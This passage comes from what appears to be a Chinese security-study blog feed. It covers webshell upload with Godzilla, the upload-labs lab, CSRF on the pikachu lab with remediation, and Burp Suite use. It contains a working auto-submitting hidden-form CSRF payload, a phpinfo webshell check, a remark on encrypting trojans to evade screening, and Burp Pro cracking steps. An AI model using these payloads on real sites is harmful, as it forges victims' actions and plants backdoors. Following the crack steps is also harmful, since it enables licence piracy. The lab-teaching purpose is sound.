class="line">加密器：生成某些服务加密的木马来躲避文件管理人员的筛查，譬如生成流量加密的木马，同时加密器需要密钥服务，有密钥才能进行解密。</span><br></pre></td></tr></table></figure><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182837145.png" class="" title="image-20240905182837145"><h6 id="3-拿取webshell"><a href="#3-拿取webshell" class="headerlink" title="3.拿取webshell"></a>3.拿取webshell</h6><p>将哥斯拉生成的木马上传后，拿到上传路径url，之后就可以点击目标添加根据木马类型来拿取webshell添加连接了。</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905183004856.png" class="" title="image-20240905183004856"><h6 id="4-操作连接"><a href="#4-操作连接" class="headerlink" title="4.操作连接"></a>4.操作连接</h6><p>添加完连接之后就可以右键点击进入来进行后续操作了，这里可以看到哥斯拉也是提供了很多功能，而且提供了很多便捷操作按钮。</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905183015562.png" class="" title="image-20240905183015562"><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905183023667.png" class="" title="image-20240905183023667"><h2 id="upload-labs靶场"><a href="#upload-labs靶场" class="headerlink" title="upload-labs靶场"></a>upload-labs靶场</h2><h3 id="靶场安装流程"><a href="#靶场安装流程" class="headerlink" title="靶场安装流程"></a>靶场安装流程</h3><p>靶场安装使用docker容器虚拟机安装，没有使用小皮本地安装，upload-labs靶场有些关卡利用的是linux特性，有些利用的windows特性，这里虚拟机使用的kali所以主要运用linux特性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">安装流程：</span><br><span class="line"></span><br><span class="line">docker search upload-labs</span><br><span class="line"></span><br><span class="line">docker pull c0ny1/upload-labs:latest</span><br><span class="line"></span><br><span class="line">docker run -itd -p 8081:80 -p 3307：3307 aa4</span><br></pre></td></tr></table></figure><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905183032202.png" class="" title="image-20240905183032202"><h3 id="前后端检测判断方法"><a href="#前后端检测判断方法" class="headerlink" title="前后端检测判断方法"></a>前后端检测判断方法</h3><p>在提交文件时，打开控制台，通过查看控制台网络部分是否含有后端文件数据包来判断是不是后端检测，同时也可以检查前端js代码来判断前端检测方式。</p><h3 id="上传路径获取方式"><a href="#上传路径获取方式" class="headerlink" title="上传路径获取方式"></a>上传路径获取方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.查看前端代码，来判断文件上传位置来确定路径。</span><br><span class="line"></span><br><span class="line">2.通过右键图片，用新标签页打开来直接抵达文件位置，从而确定文件路径</span><br></pre></td></tr></table></figure><h3 id="木马上传成功使用验证"><a href="#木马上传成功使用验证" class="headerlink" title="木马上传成功使用验证"></a>木马上传成功使用验证</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=phpinfo();</span><br></pre></td></tr></table></figure><p>使用上边的指令通过页面弹出方式来判断是否上传成功，以及能否使用。</p>]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> 命令注入 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 命令注入 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞相关学习</title>
      <link href="/2024/08/16/CSRF%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/08/16/CSRF%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF（Cross-Site Request Forgery，跨站请求伪造），特通过伪装成网站内收信任的用户请求受信任的网站，他和xss漏洞不一样，xss漏洞是通过攻击站点内的信任用户，因为csrf相对于xss没有那么流行，所以防范资源也相对稀少，所以被认为csrf相比xss的危险性更大。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>攻击者预测出了url的重要参数值，以此来伪造一个url请求</p><img src="/2024/08/16/CSRF%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240816175440869.png" class="" title="image-20240816175440869"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">##受攻击流程</span><br><span class="line"></span><br><span class="line">user1使用账号密码访问网站A</span><br><span class="line">网站A接受账号密码后在user1浏览器中存储了sessionID</span><br><span class="line">网站在没有退出网站A时新建一个页面访问了网站B</span><br><span class="line">网站B自动触发访问网站A（有指向链接指向网站A）</span><br><span class="line">此时user1是带着sessionID访问网站A的</span><br><span class="line">此时网站A只需检验sessionIlD是否合法，合法则执行相应的操作。(因此具体啥工具就得看链接，以及网站B要求访问时携带的数据)</span><br><span class="line"></span><br><span class="line">##示例</span><br><span class="line">当你想再A网站给某个用户转账100元，那么单击&quot;转账&quot;按钮后，发出的http请求大概是&quot;pay.php?user=xx&amp;money=100&quot;类似，此时攻击者在B网站构造链接&quot;pay.php?user=hack&amp;money=100&quot;,当用户没有退出A网站访问B网站并点击该链接就会导致你向攻击者账户转账100元，但这只涉及用户的操作，攻击者并没有获取用户Cookie或其他信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">##受害者被危害的前提</span><br><span class="line"></span><br><span class="line">受害者登录受信任网站A，在本地生成cookie</span><br><span class="line">受害者在不登出网站A的前提下，访问攻击网站B（或访问了攻击者构造的URL）</span><br></pre></td></tr></table></figure><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>csrf攻击一般需要两个网站，这里用pikachu靶场演示攻击流程，我们用提示的账号密码来充当账户A，我们是攻击者B，pikachu靶场的post关比较符合攻击流程。</p><p><strong>首先</strong>账户A在<a href="http://192.168.236.129:8084/vul/csrf/csrfpost/csrf_post.php%E7%99%BB%E5%BD%95%E3%80%82">http://192.168.236.129:8084/vul/csrf/csrfpost/csrf_post.php登录。</a></p><img src="/2024/08/16/CSRF%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240904132549286.png" class="" title="image-20240904132549286"><img src="/2024/08/16/CSRF%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240904132739814.png" class="" title="image-20240904132739814"><p>可以看到报文是明文显示的，可以预测，正常的攻击流程需要一个可以被访问的攻击网站，这里我们就用一个有相关html页面的机器替代，之后将链接发给账户A点击<a href="http://127.0.0.1:81/csrf.html,%E5%AE%9E%E7%8E%B0%E4%BF%AE%E6%94%B9%E4%BF%A1%E6%81%AF%E3%80%82">http://127.0.0.1:81/csrf.html,实现修改信息。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script&gt;                                                              &lt;!-- 这个script是用来自动提交表单的 --&gt;</span><br><span class="line">        window.onload = function() &#123;</span><br><span class="line">        document.getElementById(&quot;submit&quot;).click();</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;              </span><br><span class="line">    &lt;body&gt;</span><br><span class="line">&lt;form  action=&quot;http://192.168.101.16/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot; method=&quot;POST&quot;&gt;    </span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;girl&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;12345678922&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;usa&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;xiannv@pikachu.com&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">            &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Submit request&quot; style=&quot;display:none&quot;/&gt;                    &lt;!-- style设置为display:none起到隐藏submit按钮的作用 --&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">##代码来源：http://t.csdnimg.cn/a4DZu</span><br></pre></td></tr></table></figure><h2 id="burp测试csrf"><a href="#burp测试csrf" class="headerlink" title="burp测试csrf"></a>burp测试csrf</h2><p>在抓到包后，右键使用csrfpoc生成工具，攻击者可以将生成的html页面放在自己的服务器页面，或者直接用下图的测试链接，在浏览器打开，点击页面上的提交按钮，放包，之后发生页面跳转，之后会发现跳转的页面为更改完信息的页面，csrf利用成功。</p><img src="/2024/08/16/CSRF%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240908172440490.png" class="" title="image-20240908172440490"><h2 id="修复手段"><a href="#修复手段" class="headerlink" title="修复手段"></a>修复手段</h2><p>1.<strong>使用CSRF令牌</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">生成令牌：为每个用户会话生成一个唯一的CSRF令牌。这个令牌应该是随机生成的，并且与用户会话相关联。</span><br><span class="line"></span><br><span class="line">嵌入令牌：在表单中嵌入这个令牌（通常在隐藏字段中），或者通过HTTP头传递。例如，使用`&lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;令牌值&quot;&gt;`。</span><br><span class="line"></span><br><span class="line">验证令牌：在服务器端验证每个请求中的令牌。如果令牌无效或者缺失，则拒绝请求。</span><br></pre></td></tr></table></figure><p>2.<strong>使用SameSite Cookie属性</strong>：</p><p>设置SameSite</p><p>：在设置Cookie时，使用SameSite属性来限制Cookie的跨站点请求。可以设置为Strict（仅在同一站点上发送）或Lax（在某些情况下允许发送）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CodeSet-Cookie: sessionId=abc123; SameSite=Strict</span><br></pre></td></tr></table></figure><p>3.<strong>验证HTTP Referer或Origin头</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">检查Referer头：验证`Referer`头或`Origin`头是否来自合法的来源。注意，这种方法并不是绝对可靠，因为`Referer`头可以被伪造或省略。</span><br><span class="line"></span><br><span class="line">实施策略：检查请求的来源是否与期望的来源匹配。如果不匹配，则拒绝请求。</span><br></pre></td></tr></table></figure><p>4.<strong>采用安全的HTTP方法</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">限制方法：只允许特定的HTTP方法（如`GET`、`POST`、`PUT`、`DELETE`）对特定资源进行访问。尤其是对可能修改数据的操作使用`POST`，并确保这些操作有有效的CSRF保护。</span><br></pre></td></tr></table></figure><p>5.<strong>确保表单和AJAX请求都使用CSRF令牌</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">表单保护：对所有提交数据的表单添加CSRF令牌。</span><br><span class="line"></span><br><span class="line">AJAX请求保护：</span><br><span class="line">对所有AJAX请求也添加CSRF令牌。这通常通过设置自定义HTTP头来实现：</span><br><span class="line"></span><br><span class="line">javascriptCopy Code$.ajaxSetup(&#123;</span><br><span class="line">  headers: &#123;</span><br><span class="line">    &#x27;X-CSRF-Token&#x27;: $(&#x27;meta[name=&quot;csrf-token&quot;]&#x27;).attr(&#x27;content&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>6.<strong>保持系统和库的更新</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">应用补丁：确保你使用的框架和库都保持最新状态，因为更新通常包含了安全修复。</span><br></pre></td></tr></table></figure><p>7.<strong>使用安全框架和库</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">框架支持：利用现代Web框架提供的内置CSRF保护功能。这些框架通常提供了处理CSRF令牌和验证的工具，减少了实现复杂度。</span><br></pre></td></tr></table></figure><p>8.<strong>教育和审计</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">开发人员培训：确保开发人员了解CSRF的风险和防护措施。</span><br><span class="line">代码审计：定期进行代码审计，以确保CSRF保护措施得以正确实施。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> csrf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> csrf </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite使用</title>
      <link href="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><h3 id="专业版激活流程"><a href="#专业版激活流程" class="headerlink" title="专业版激活流程"></a>专业版激活流程</h3><h4 id="1-启动burpsuite"><a href="#1-启动burpsuite" class="headerlink" title="1.启动burpsuite"></a>1.启动burpsuite</h4><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113172802475.png" class="" title="image-20240113172802475"><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113173047443.png" class="" title="image-20240113173047443"><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113173107980.png" class="" title="image-20240113173107980"><h4 id="2-打开破解工具"><a href="#2-打开破解工具" class="headerlink" title="2.打开破解工具"></a>2.打开破解工具</h4><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113172840572.png" class="" title="image-20240113172840572"><h4 id="3-将破解工具的参数传入burpsuite"><a href="#3-将破解工具的参数传入burpsuite" class="headerlink" title="3.将破解工具的参数传入burpsuite"></a>3.将破解工具的参数传入burpsuite</h4><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113173416267.png" class="" title="image-20240113173416267"><h4 id="4-获取破解密文"><a href="#4-获取破解密文" class="headerlink" title="4.获取破解密文"></a>4.获取破解密文</h4><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113173511081.png" class="" title="image-20240113173511081"><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113173834344.png" class="" title="image-20240113173834344"><h4 id="5-创建桌面快捷方式"><a href="#5-创建桌面快捷方式" class="headerlink" title="5.创建桌面快捷方式"></a>5.创建桌面快捷方式</h4><p>​<strong>右键属性&#x3D;&#x3D;》新建快捷方式&#x3D;&#x3D;》拖至桌面&#x3D;&#x3D;》更改名称图标</strong></p><hr><h3 id="BurpSuite使用介绍"><a href="#BurpSuite使用介绍" class="headerlink" title="BurpSuite使用介绍"></a>BurpSuite使用介绍</h3><p><strong>批注：burpsuite作为一个代理，夹在网站客户端与网站服务器之间，是起到一个欺骗客户端浏览器，使其认为自己是网站服务器，以此来实现代理修改数据的作用。</strong></p><h4 id="Proxy（抓包代理）"><a href="#Proxy（抓包代理）" class="headerlink" title="Proxy（抓包代理）"></a>Proxy（抓包代理）</h4><p>​<strong>代理区，burpsuite的主要功能点，在浏览器与服务器的交流中加了一层代理。</strong></p><p>​<strong>相比于浏览器自带的代理工具，burpsuite可以实现对数据包进行修改。</strong></p><p>​<strong>需要注意的是，在代理期间，数据包是不会被发送的。</strong></p><h5 id="intercept"><a href="#intercept" class="headerlink" title="intercept"></a>intercept</h5><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113174205144.png" class="" title="image-20240113174205144"><p>​<strong>intercept is off：拦截数据包，要注意burpsuite会抓取所有的数据包</strong></p><p>​<strong>open brower：打开burpsuite自带的可以开启代理的浏览器</strong></p><p>​<strong>Forward：放行数据包</strong></p><p>​<strong>Drop：丢包，数据包不再发送</strong></p><h5 id="HTTP-history"><a href="#HTTP-history" class="headerlink" title="HTTP history"></a>HTTP history</h5><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113175920025.png" class="" title="image-20240113175920025"><p><strong>在这里记录所有的数据包，但是由于数据包太多，所以在目标明确时，要使用筛选。</strong></p><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113182452795.png" class="" title="image-20240113182452795"><p><strong>但是如果目标不明确，还是建议通过浏览器（这里建议使用火狐）自带的开发者工具，通过不断的点击清除数据包内容，点击相关功能点，停止与开始来不断锁定数据包的范围。</strong></p><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113183542589.png" class="" title="image-20240113183542589"><h5 id="Porxy-settings（设置）"><a href="#Porxy-settings（设置）" class="headerlink" title="Porxy settings（设置）"></a>Porxy settings（设置）</h5><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113184647843.png" class="" title="image-20240113184647843"><p><strong>127.0.0.1：被允许经过代理（bp）的设备ip</strong></p><p><strong>8080：代理（bp）占用的端口</strong></p><h6 id="批注：端口号范围（0-》65535）"><a href="#批注：端口号范围（0-》65535）" class="headerlink" title="批注：端口号范围（0&#x3D;&#x3D;》65535）"></a>批注：端口号范围（0&#x3D;&#x3D;》65535）</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">计算机端口号是用于标识网络通信中特定应用程序或服务的数字。端口号范围从0到65535，被分为以下几个范围：</span><br><span class="line"></span><br><span class="line">知名端口（Well-known Ports）：从0到1023，用于一些常见的标准服务。例如，端口号80用于HTTP通信，端口号443用于HTTPS通信。</span><br><span class="line"></span><br><span class="line">登记端口（Registered Ports）：从1024到49151，用于一些已经被注册的应用程序或服务。这些端口号可以由第三方应用程序使用，但建议避免与已知的标准端口号冲突。</span><br><span class="line"></span><br><span class="line">动态和/或私有端口（Dynamic and/or Private Ports）：从49152到65535，用于临时或私有的通信。这些端口号可以由客户端应用程序或临时服务器使用。</span><br><span class="line"></span><br><span class="line">需要注意的是，某些端口号具有特殊的约定用途，例如端口号20和21用于FTP（文件传输协议），端口号22用于SSH（安全外壳协议），端口号25用于SMTP（简单邮件传输协议）等。在进行网络通信时，应确保正确选择和配置端口号以确保应用程序之间的正常通信。</span><br></pre></td></tr></table></figure><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113185311907.png" class="" title="image-20240113185311907"><p><strong>Loopback only：只能抓取本机发出的数据包</strong></p><p><strong>All interfaces：可以抓取所有经过代理的数据包</strong></p><p><strong>Specific address：只能抓取特定ip经过代理的数据包</strong></p><h5 id="（https协议限制）解决办法：证书下载"><a href="#（https协议限制）解决办法：证书下载" class="headerlink" title="（https协议限制）解决办法：证书下载"></a>（https协议限制）解决办法：证书下载</h5><h6 id="证书下载流程"><a href="#证书下载流程" class="headerlink" title="证书下载流程"></a>证书下载流程</h6><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113192826308.png" class="" title="image-20240113192826308"><p><strong>访问burpsuite中的ip号和端口号，点击CA下载证书</strong></p><h6 id="证书导入流程"><a href="#证书导入流程" class="headerlink" title="证书导入流程"></a>证书导入流程</h6><p><strong>单个浏览器引入：设置搜索栏&#x3D;&#x3D;》搜索证书&#x3D;&#x3D;》查看证书&#x3D;&#x3D;》导入下载好的证书</strong></p><p><strong>系统引入：双击证书&#x3D;&#x3D;》安装证书&#x3D;&#x3D;》为当前用户安装&#x3D;&#x3D;》下一步&#x3D;&#x3D;》下一步&#x3D;&#x3D;》完成（如果出现问题则）</strong></p><p>​    <strong>双击证书&#x3D;&#x3D;》安装证书&#x3D;&#x3D;》为当前用户安装&#x3D;&#x3D;》将所有证书放入以下存储（受信任的证书颁发机构）&#x3D;&#x3D;》下一步&#x3D;&#x3D;》完成</strong></p><p><strong>https协议</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTPS（Hypertext Transfer Protocol Secure）是一种通过加密和身份验证来保护网络通信安全的协议。它是基于HTTP协议的，但在传输过程中使用了SSL（Secure Sockets Layer）或TLS（Transport Layer Security）协议来加密数据。</span><br><span class="line"></span><br><span class="line">HTTPS的工作原理如下：</span><br><span class="line"></span><br><span class="line">1.客户端发起连接请求：客户端（例如Web浏览器）向服务器发起HTTPS连接请求。</span><br><span class="line"></span><br><span class="line">2.服务器证书验证：服务器将自己的数字证书发送给客户端。证书中包含了服务器公钥和证书颁发机构（CA）的签名。</span><br><span class="line"></span><br><span class="line">3.客户端验证证书：客户端验证服务器证书的合法性和真实性。它会检查证书的有效性、签名是否可信，并与本地存储的根证书进行比对。</span><br><span class="line"></span><br><span class="line">4.密钥交换：如果服务器证书验证通过，客户端生成一个用于加密会话的随机密钥，并使用服务器的公钥对该密钥进行加密，然后发送给服务器。</span><br><span class="line"></span><br><span class="line">5.数据加密传输：服务器使用自己的私钥解密客户端发送过来的密钥，并将其保存在服务器中。之后，客户端和服务器可以使用这个共享的密钥来加密和解密数据，确保数据传输的机密性。</span><br><span class="line"></span><br><span class="line">安全传输数据：建立安全的通信通道后，客户端和服务器之间的所有数据都会被加密，并通过加密通道进行传输。</span><br></pre></td></tr></table></figure><p><strong>所以bp作为代理是无法给浏览器客户端发送证书的，需要下载相应的证书才能完成代理的流程。</strong></p><h4 id="Repeater（重发器）"><a href="#Repeater（重发器）" class="headerlink" title="Repeater（重发器）"></a>Repeater（重发器）</h4><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113204249008.png" class="" title="image-20240113204249008"><h5 id="Pretty（原始响应）"><a href="#Pretty（原始响应）" class="headerlink" title="Pretty（原始响应）"></a>Pretty（原始响应）</h5><h5 id="Raw（格式化；ps：没啥屁用）"><a href="#Raw（格式化；ps：没啥屁用）" class="headerlink" title="Raw（格式化；ps：没啥屁用）"></a>Raw（格式化；ps：没啥屁用）</h5><h5 id="Hex（16进制）"><a href="#Hex（16进制）" class="headerlink" title="Hex（16进制）"></a>Hex（16进制）</h5><h5 id="Render（渲染结构）"><a href="#Render（渲染结构）" class="headerlink" title="Render（渲染结构）"></a>Render（渲染结构）</h5><h5 id="“"><a href="#“" class="headerlink" title="“&lt;”(返回上一次修改)"></a>“&lt;”(返回上一次修改)</h5><h5 id="“-”-到达下一次修改"><a href="#“-”-到达下一次修改" class="headerlink" title="“&gt;”(到达下一次修改)"></a>“&gt;”(到达下一次修改)</h5><h5 id="cancel（取消修改）"><a href="#cancel（取消修改）" class="headerlink" title="cancel（取消修改）"></a>cancel（取消修改）</h5><h4 id="intruder（入侵者模块）"><a href="#intruder（入侵者模块）" class="headerlink" title="intruder（入侵者模块）"></a>intruder（入侵者模块）</h4><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240115220820099.png" class="" title="image-20240115220820099"><h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Add：选中部分添加变量</span><br><span class="line"></span><br><span class="line">Clear：选中部分清除变量</span><br><span class="line"></span><br><span class="line">Auto：自动选择变量</span><br><span class="line"></span><br><span class="line">Refresh：清除所有变量</span><br></pre></td></tr></table></figure><h5 id="模式（Choose-an-attack-type）"><a href="#模式（Choose-an-attack-type）" class="headerlink" title="模式（Choose an attack type）"></a>模式（Choose an attack type）</h5><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240115221234760.png" class="" title="image-20240115221234760"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Sniper（狙击手）：只有一个变量生效，一次只能爆破一个变量</span><br><span class="line"></span><br><span class="line">Battering ram（攻城锤）：多变量生效，但是单字典，两个或多个字典同时赋予的是同一个值，（单字典，多变量同步枚举）</span><br><span class="line"></span><br><span class="line">Pitchfork（干草叉）：多变量，多字典，一个变量对应一个字典（多变量，多字典同步枚举）</span><br><span class="line"></span><br><span class="line">Cluster bomb（集束炸弹）：迭代枚举，（123）（456）第一个字典每个数要匹配第二个字典的每一位数3*3，所以不常用。</span><br><span class="line">（如果数量太大，很有可能会导致网站崩溃。）</span><br></pre></td></tr></table></figure><h5 id="Payload（字典遍历）"><a href="#Payload（字典遍历）" class="headerlink" title="Payload（字典遍历）"></a>Payload（字典遍历）</h5><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240116090514290.png" class="" title="image-20240116090514290"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> Payload processing</span><br><span class="line"></span><br><span class="line">添加变量规则。</span><br></pre></td></tr></table></figure><h4 id="comparer（比较模块）"><a href="#comparer（比较模块）" class="headerlink" title="comparer（比较模块）"></a>comparer（比较模块）</h4><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113205745815.png" class="" title="image-20240113205745815"><p><strong>将两个数据包的不同之处标注出来，方便对比</strong></p><h4 id="Decoder（解码模块）"><a href="#Decoder（解码模块）" class="headerlink" title="Decoder（解码模块）"></a>Decoder（解码模块）</h4><p><strong>将内容解码或者编码</strong></p><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113210303687.png" class="" title="image-20240113210303687"><h4 id="Logger（日志模块）"><a href="#Logger（日志模块）" class="headerlink" title="Logger（日志模块）"></a>Logger（日志模块）</h4><p><strong>记录自己的所有请求</strong></p><img src="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/image-20240113211849596.png" class="" title="image-20240113211849596"><h4 id="Targer（目标模块）"><a href="#Targer（目标模块）" class="headerlink" title="Targer（目标模块）"></a>Targer（目标模块）</h4><p><strong>将bp获取到的所有请求，按照分类方式（协议一样，域名一样，端口一样）排列域名，按照文件路径排列文件，然后汇总在这个模块</strong></p><img 